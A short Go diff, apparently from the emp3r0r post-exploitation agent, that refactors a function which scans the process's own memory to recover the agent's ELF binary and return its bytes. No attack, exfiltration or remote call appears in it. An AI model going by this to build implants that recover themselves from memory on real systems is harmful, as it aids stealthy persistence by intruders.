@@ -15,7 +15,7 @@ import (
 
 // FindEmp3r0rELFInMem search process memory for emp3r0r ELF
 // FIXME Not working when using loaders
-func FindEmp3r0rELFInMem() (err error) {
+func FindEmp3r0rELFInMem() (elf_bytes []byte, err error) {
 	mem_regions, err := DumpSelfMem()
 	if err != nil {
 		err = fmt.Errorf("cannot dump self memory: %v", err)
@@ -103,12 +103,13 @@ func FindEmp3r0rELFInMem() (err error) {
 			elf_data = append(elf_data, current_region[start-start_of_current_region:end-start_of_current_region]...)
 
 			log.Printf("Saved %d bytes to EXE_MEM_FILE", len(elf_data))
-			EXE_MEM_FILE = elf_data
+			elf_bytes = elf_data
 			break
 		}
 	}
-	if len(EXE_MEM_FILE) <= 0 {
-		return fmt.Errorf("no emp3r0r ELF found in memory")
+	if len(elf_bytes) <= 0 {
+		err = fmt.Errorf("no emp3r0r ELF found in memory")
+		return
 	}
 
 	return
